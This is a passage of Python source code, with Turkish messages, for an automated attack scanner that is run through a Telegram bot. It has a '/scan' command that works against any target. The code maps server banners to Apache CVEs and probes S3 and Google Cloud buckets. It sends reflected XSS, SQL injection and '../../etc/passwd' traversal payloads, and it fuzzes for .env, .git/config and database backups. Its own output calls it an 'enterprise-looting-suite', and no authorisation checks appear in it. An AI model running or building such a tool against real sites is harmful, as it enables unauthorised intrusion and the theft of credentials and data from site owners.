    "apache/2.4.49": "CVE-2021-41773 (Path Traversal & RCE)",
    "apache/2.4.50": "CVE-2021-42013 (Path Traversal & RCE)",
    "nginx": "Olası yanlış yapılandırma kontrolü önerilir",
    "openssh": "Versiyon bazlı sömürü riskleri incelenmeli"
}
def match_cves(banner_str):
    matched = []
    b_lower = banner_str.lower()
    for k, v in CVE_DATABASE.items():
        if k in b_lower: matched.append(v)
    return matched

def check_cloud_buckets(domain):
    base_name = domain.split('.')[0]
    buckets = [
        f"https://{base_name}.s3.amazonaws.com",
        f"https://{domain}-backup.s3.amazonaws.com",
        f"https://storage.googleapis.com/{base_name}"
    ]
    found_buckets = []
    for b in buckets:
        try:
            r = requests.get(b, timeout=2, verify=False)
            if r.status_code in [200, 403]:
                found_buckets.append(f"{b} (Status: {r.status_code})")
        except: pass
    return found_buckets

def analyze_javascript_endpoints(target_url, html_content):
    found = set()
    try:
        soup = BeautifulSoup(html_content, 'html.parser')
        for script in soup.find_all('script'):
            src = script.get('src')
            if src:
                if src.startswith('http'): s_url = src
                elif src.startswith('/'):
                    p = urllib.parse.urlparse(target_url)
                    s_url = f"{p.scheme}://{p.netloc}{src}"
                else: continue
                try:
                    js_res = requests.get(s_url, timeout=2, verify=False)
                    if js_res.status_code == 200:
                        matches = re.findall(r'["\'](/api/[a-zA-Z0-9_/.-]+|/v[1-9]/[a-zA-Z0-9_/.-]+)["\']', js_res.text)
                        for m in matches: found.add(m)
                except: pass
    except: pass
    return list(found)

def test_api_endpoints(target_url, endpoints):
    api_results = []
    parsed_base = urllib.parse.urlparse(target_url)
    base = f"{parsed_base.scheme}://{parsed_base.netloc}"
    
    for ep in endpoints:
        full_ep_url = ep if ep.startswith("http") else f"{base}{ep if ep.startswith('/') else '/' + ep}"
        try:
            r = requests.get(full_ep_url, timeout=3, verify=False, headers={"User-Agent": "Mozilla/5.0"})
            status = r.status_code
            preview = r.text[:80].replace('\n', ' ')
            api_results.append((full_ep_url, status, preview))
        except:
            api_results.append((full_ep_url, "Error", "Bağlantı Başarısız"))
    return api_results

def test_xss_open_redirect(target_url):
    findings = []
    xss_payload = "<script>alert(1)</script>"
    test_urls = [
        f"{target_url.rstrip('/')}/?q={urllib.parse.quote(xss_payload)}",
        f"{target_url.rstrip('/')}/?search={urllib.parse.quote(xss_payload)}"
    ]
    for tu in test_urls:
        try:
            r = requests.get(tu, timeout=3, verify=False, headers={"User-Agent": "Mozilla/5.0"})
            if xss_payload in r.text: findings.append(tu)
        except: pass
    return findings

def test_sql_injection(target_url):
    sqli_vulns = []
    test_payloads = ["?id=1'", "/?search=test'", "/api/v1/users?id=1'"]
    sql_errors = ["sql syntax", "mysql_fetch", "syntax error", "unclosed quotation", "odbc_driver"]
    for payload in test_payloads:
        test_url = f"{target_url.rstrip('/')}{payload}"
        try:
            r = requests.get(test_url, timeout=3, verify=False, headers={"User-Agent": "Mozilla/5.0"})
            body_lower = r.text.lower()
            for err in sql_errors:
                if err in body_lower:
                    sqli_vulns.append(test_url)
                    break
        except: pass
    return sqli_vulns

def test_lfi_traversal(target_url):
    lfi_vulns = []
    test_payloads = ["/?page=../../../../etc/passwd", "/?file=../../../../etc/passwd"]
    for payload in test_payloads:
        test_url = f"{target_url.rstrip('/')}{payload}"
        try:
            r = requests.get(test_url, timeout=3, verify=False, headers={"User-Agent": "Mozilla/5.0"})
            if "root:x:0:0" in r.text or "bin:x" in r.text:
                lfi_vulns.append(test_url)
        except: pass
    return lfi_vulns

def check_single_path(base_url, path):
    t_url = f"{base_url.rstrip('/')}{path}"
    try:
        res = requests.get(t_url, timeout=3, verify=False, headers={"User-Agent": "Mozilla/5.0"})
        if res.status_code == 200: return ("200", t_url)
        elif res.status_code == 403: return ("403", path)
    except: pass
    return None

def multi_threaded_fuzzing(target_url, all_paths):
    accessible = []
    forbidden = []
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = {executor.submit(check_single_path, target_url, path): path for path in all_paths}
        for future in as_completed(futures):
            res = future.result()
            if res:
                status, val = res
                if status == "200": accessible.append(val)
                elif status == "403": forbidden.append(val)
    return accessible, forbidden

def red_team_comprehensive_recon(target_url, custom_paths=[]):
    if not target_url.startswith("http"): target_url = f"https://{target_url}"
    is_https = target_url.startswith("https")
    parsed = urllib.parse.urlparse(target_url)
    domain = parsed.netloc or parsed.path
    domain = domain.split('/')[0]
    
    report = f"root@red-team-box:~# enterprise-looting-suite --target {target_url}\n"
    report += "=" * 65 + "\n\n"
    
    accessible_files = []
    waf_info = "Bilinmeyen"
    grade_info = "F"
    
    try:
        r = requests.get(target_url, timeout=5, verify=False, headers={"User-Agent": "Mozilla/5.0"})
        headers = r.headers
        waf_info = detect_waf(headers, str(r.cookies.get_dict()))
        grade_info, score, deductions = calculate_security_grading(headers, is_https)
        
        report += f"[+] WAF Tespiti: {waf_info}\n"
        report += f"[+] Güvenlik Puanı: {grade_info} ({score}/100)\n"
        report += "-" * 45 + "\n"
    except Exception as e:
        report += f"[!] HTTP Bağlantı Uyarısı: {str(e)}\n"

    report += "[*] Çözümleniyor: nslookup...\n"
    report += run_linux_command(f"nslookup {domain}") + "\n" + "-" * 40 + "\n"

    report += "[*] Multi-Threaded Port Taraması ve Banner Grabbing / CVE Eşleştirme...\n"
    open_ports = multi_threaded_port_scan(domain)
    report += f"  -> Açık Portlar: {open_ports}\n"
    if open_ports:
        banners = banner_grabbing(domain, open_ports)
        for port, b in banners.items():
            report += f"     Port {port} Banner: {b}\n"
            cves = match_cves(b)
            if cves:
                for cve in cves:
                    report += f"     🚨 [CVE MATCH] {cve}\n"
                    accessible_files.append(f"Port {port} CVE: {cve}")
    report += "-" * 40 + "\n"

    report += "[*] Cloud S3 Bucket & Kaynak Kod Sızıntı Taraması (.git)...\n"
    buckets = check_cloud_buckets(domain)
    if buckets:
        for b in buckets:
            report += f"  🚨 [CLOUD BUCKET] Açık Depo Bulundu: {b}\n"
            accessible_files.append(b)
    else:
        report += "  -> Doğrudan açık S3 bucket saptanamadı.\n"
    report += "-" * 40 + "\n"

    report += "[*] JavaScript API Endpoint Keşfi ve Test İstekleri...\n"
    try:
        endpoints = analyze_javascript_endpoints(target_url, r.text)
        if endpoints:
            api_test_results = test_api_endpoints(target_url, endpoints)
            for ep_url, status, preview in api_test_results:
                report += f"  [API TEST] {ep_url} -> Status: {status} | Önizleme: {preview}\n"
                accessible_files.append(ep_url)
        else:
            report += "  -> Harici API endpoint bulunamadı.\n"
    except: pass
    report += "-" * 40 + "\n"

    report += "[*] Aktif Zafiyet Taraması (SQLi, LFI & Reflected XSS)...\n"
    sqli_results = test_sql_injection(target_url)
    if sqli_results:
        for sq in sqli_results:
            report += f"  🚨 [VULN - SQLi] {sq}\n"
            accessible_files.append(sq)
    
    lfi_results = test_lfi_traversal(target_url)
    if lfi_results:
        for lf in lfi_results:
            report += f"  🚨 [VULN - LFI] {lf}\n"
            accessible_files.append(lf)

    xss_results = test_xss_open_redirect(target_url)
    if xss_results:
        for xs in xss_results:
            report += f"  🚨 [VULN - XSS] {xs}\n"
            accessible_files.append(xs)
    report += "-" * 40 + "\n"

    report += "[*] Multi-Threaded Dizin & .git / Config Fuzzing...\n"
    default_paths = [
        "/robots.txt", "/sitemap.xml", "/.env", "/config.json", "/config.php",
        "/.git/HEAD", "/.git/config", "/database.sql", "/backup.sql", "/admin/"
    ]
    all_paths = list(set(default_paths + custom_paths))
    
    acc, forb = multi_threaded_fuzzing(target_url, all_paths)
    for a in acc:
        report += f"  [ALERT - 200 OK] {a}\n"
        accessible_files.append(a)
    for f in forb:
        report += f"  [FORBIDDEN - 403] {f}\n"

    report += "\n" + "=" * 65 + "\nroot@red-team-box:~# Enterprise Looting Scan Completed."
    
    record = {
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "target": target_url,
        "waf": waf_info,
        "grade": grade_info,
        "files": accessible_files,
        "full_report": report
    }
    
    return report, record

def run_telegram_bot():
    print("Telegram bot aktif...")
    offset = 0
    while True:
        try:
            response = requests.get(f"{BASE_URL}/getUpdates", params={"offset": offset, "timeout": 30}, timeout=35)
            if response.status_code == 200:
                for result in response.json().get("result", []):
                    offset = result["update_id"] + 1
                    msg = result.get("message")
                    if not msg or "text" not in msg: continue
                    chat_id = msg["chat"]["id"]
                    text = msg["text"].strip()
                    if text.startswith("/scan"):
                        parts = text.split(maxsplit=1)
                        if len(parts) < 2: continue
                        target = parts[1].strip()
                        requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": chat_id, "text": f"⏳ `{target}` taranıyor...", "parse_mode": "Markdown"})
                        report, _ = red_team_comprehensive_recon(target, [])
                        if len(report) > 4000: report = report[:4000] + "\n...(Kısaltıldı)"
                        requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": chat_id, "text": f"```\n{report}\n```", "parse_mode": "Markdown"})
        except: time.sleep(5)

if __name__ == "__main__":
    threading.Thread(target=run_telegram_bot, daemon=True).start()
    threading.Thread(target=background_monitor_loop, daemon=True).start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
